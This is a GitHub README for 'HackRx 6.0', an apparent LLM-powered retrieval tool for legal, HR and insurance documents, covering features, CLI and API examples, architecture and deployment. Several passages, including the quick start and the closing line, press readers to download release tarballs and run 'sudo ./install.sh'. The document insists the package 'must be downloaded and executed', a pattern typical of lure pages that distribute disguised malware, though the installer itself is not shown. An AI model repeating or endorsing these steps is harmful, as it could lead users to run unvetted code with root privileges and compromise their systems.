[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github&style=flat-square)](https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases)

# HackRx 6.0 — Intelligent Query Retrieval for Legal & HR

![HackRx banner](https://images.unsplash.com/photo-1559526324-593bc073d938?auto=format&fit=crop&w=1350&q=80)

A production-ready, LLM-powered system for intelligent query retrieval from large documents. HackRx 6.0 processes PDFs, DOCX, and emails. It supports semantic search, clause matching, and outputs explainable JSON decisions for insurance, legal, HR, and compliance workflows.

Badges
- Topics: clause-matching · compliance · document-processing · docx · email · explainable-ai · faiss · hackathon · hr · insurance · intelligent-systems · json · legal · llm · pdf · pinecone · query-retrieval · semantic-search
- License: MIT

Table of contents
- Features
- Quick start
- Command line examples
- API examples
- Architecture
- Data flow
- Supported formats
- Explainable JSON output
- Vector stores and embedding
- Deployment
- Contributing
- Releases

Features
- Ingest large documents: PDF, DOCX, EML (email).
- Chunking and overlap tuning for precise retrieval.
- Language model-based semantic search and reranking.
- Clause matching with rule-assisted heuristics.
- Explainable JSON decisions for audit and compliance.
- Plug-and-play vector stores: FAISS or Pinecone.
- Batch and streaming processing modes.
- Fine-grained access control hooks for enterprise use.
- Exportable JSON that links findings to original document spans.

Quick start

1) Clone the repo
- git clone https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval.git
- cd HackRx-6.0-Intelligent-Query-Retrieval

2) Download and run the release installer
- The release package at https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases must be downloaded and executed.  
- Example (Linux):
  - curl -L -o hackrx-6.0-linux.tar.gz "https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases/download/v6.0/hackrx-6.0-linux.tar.gz"
  - tar -xzf hackrx-6.0-linux.tar.gz
  - cd hackrx-6.0
  - sudo ./install.sh
- Example (Mac / Intel):
  - curl -L -o hackrx-6.0-macos.tar.gz "https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases/download/v6.0/hackrx-6.0-macos.tar.gz"
  - tar -xzf hackrx-6.0-macos.tar.gz
  - ./install.sh

If you prefer release browser, visit the Releases page here: https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases and download the installer asset that matches your OS.

Command line examples

Indexing a document
- hackrx index --file ./examples/employee_handbook.pdf --corpus hr-handbook --chunksize 1200 --overlap 200

Search and retrieve
- hackrx search --corpus hr-handbook --query "overtime pay policy" --topk 5

Clause match
- hackrx match-clause --file contracts/contract_2024.docx --clause "termination for convenience" --threshold 0.7

Explain decision (JSON)
- hackrx explain --query-id 12345 --format json

Sample CLI session
- hackrx ingest --dir ./inbox
- hackrx embed --corpus inbox --backend faiss
- hackrx query --corpus inbox --q "data breach notification rules" --topk 7

API examples

REST: POST /v1/query
- Request
  - POST /v1/query
  - Body: { "corpus": "insurance-policies", "query": "pre-existing condition exclusion", "topk": 10 }
- Response (short)
  - {
      "query_id": "q_20250801_001",
      "results": [
        { "doc_id": "policy_123", "score": 0.92, "span": "Section 2.1..." },
        ...
      ],
      "explain": { "model": "llm-embed-v1", "steps": ["embedding","retrieval","rerank"] }
    }

Webhook-based explainable JSON
- Send results to a webhook that stores both raw spans and a human-readable rationale.
- The JSON links to original files and byte ranges for audit.

Architecture

![Architecture](https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1350&q=80)

Core components
- Ingestor: handles PDF, DOCX, and EML parsing. Extracts text, metadata, and attachments.
- Chunker: splits text into chunks with configurable overlap.
- Embedder: converts chunks to embeddings using selected LLM/embed model.
- Vector store: FAISS for on-premise or Pinecone for managed cloud.
- Retriever: nearest-neighbor search, optionally filtered by metadata.
- Reranker: LLM-based reranker that orders candidates.
- Clause matcher: rules + semantic matching to find clause equivalents.
- Explainability engine: composes the final JSON decision with provenance and rationale.
- API / CLI / Dashboard: expose endpoints and user interfaces.

Data flow
1. Upload raw files (PDF, DOCX, EML).
2. Ingestor extracts text + metadata.
3. Chunker creates indexable chunks.
4. Embedder generates vectors.
5. Vector store persists vectors and metadata.
6. User query triggers retriever and reranker.
7. Clause matcher runs pattern checks.
8. Explainability engine builds JSON with source spans and decision steps.
9. Output delivers matches and explanations.

Supported formats
- PDF: text and OCR-assisted text extraction.
- DOCX: structured parsing and style-aware extraction.
- EML (email): headers, body, attachments, MIME parsing.
- Plain text, CSV import utilities.

Explainable JSON output (example)
- {
  "query_id": "q_20250801_001",
  "query": "non-compete enforceability in CA",
  "corpus": "legal-agreements",
  "results": [
    {
      "doc_id": "nda_2021",
      "score": 0.94,
      "matches": [
        { "span": "Clause 6(a): ...", "start": 1248, "end": 1320 }
      ],
      "rationale": "LLM detected jurisdiction-specific language that limits enforceability in California.",
      "provenance": { "file_path": "agreements/nda_2021.docx", "byte_range": [1248,1320] }
    }
  ],
  "explain_pipeline": [
    { "step": "embed", "model": "embed-4", "time_ms": 120 },
    { "step": "knn_retrieve", "index": "faiss", "candidates": 50 },
    { "step": "rerank", "model": "llm-rank-2", "topk": 5 },
    { "step": "clause_match", "rules_hit": ["jurisdiction_clause", "duration_limit"] }
  ]
}

Vector stores and embedding
- FAISS: use for on-prem indices and fast local search. Configure index type based on corpus size.
- Pinecone: use for managed scale and multi-region deployment.
- Embedding models: choose open models or cloud providers. The system uses an interface so you can swap providers.

Tuning tips
- Chunk size: 800-1600 tokens works for dense legal text.
- Overlap: 100-300 tokens to keep context across chunks.
- TopK: 5-15 for reranking. Use higher values for thorough audits.
- Reranker: enable when legal precision matters.

Security and governance
- Role-based hooks: add gating before exports.
- Audit trail: all decisions attach doc id and byte ranges.
- Redaction pipeline: remove PII on ingest if needed.

Deployment

Docker
- docker build -t hackrx:6.0 .
- docker run -p 8080:8080 -e VECTOR_BACKEND=pinecone hackrx:6.0

Kubernetes
- Provide a Deployment for api, a StatefulSet for FAISS index, and a Job for batch ingest.
- Use HorizontalPodAutoscaler for API based on CPU or queue length.

Cloud
- Use managed Pinecone or vector DB as index.
- Store raw files in S3 or equivalent and keep metadata in Postgres.

Monitoring
- Collect metrics: indexing rate, query latency, embedding time.
- Track explainability coverage: percent of queries with full JSON rationales.

Examples and demo assets
- examples/ contains sample PDF, DOCX, EML and a set of queries.
- demo-notebook.ipynb shows step-by-step embedding and retrieval.
- scripts/bulk_ingest.sh for batch uploads.

Developer notes
- Modular code. Swap embedder with any model implementing the interface.
- Use environment variables for keys: PINECONE_API_KEY, OPENAI_API_KEY, etc.
- Tests: run pytest tests/.

Contributing
- Fork the repo.
- Create a feature branch.
- Open a pull request against main.
- Keep changes small and include tests for new features.

License
- MIT

Releases
- Download and run the release installer from the Releases page: https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases  
- If an asset fails, check the Releases section on GitHub for the right file and version. The Releases page lists installers for Linux, macOS, and Docker images.

Contact
- Raise issues on GitHub.
- For enterprise support, open an issue and tag it with "enterprise".

Screenshots and visuals
- UI mockups and sequence diagrams sit in docs/images/.
- Use the banner image above for presentations and slide decks.

Examples of real queries to test
- "Does this policy exclude pre-existing conditions?"
- "Find termination clauses with a 30-day notice window."
- "Show GDPR-related data retention clauses in this contract set."

Internal glossary
- Chunk: a contiguous text segment indexed as one retrieval unit.
- Retriever: component that finds candidate chunks by vector similarity.
- Reranker: LLM step that scores candidates using context and query.
- Explain JSON: structured output combining results, rationale, and provenance.

This README guides you from install to production use. Visit the Releases page now to download and execute the release package that matches your platform: https://github.com/sussybakala/HackRx-6.0-Intelligent-Query-Retrieval/releases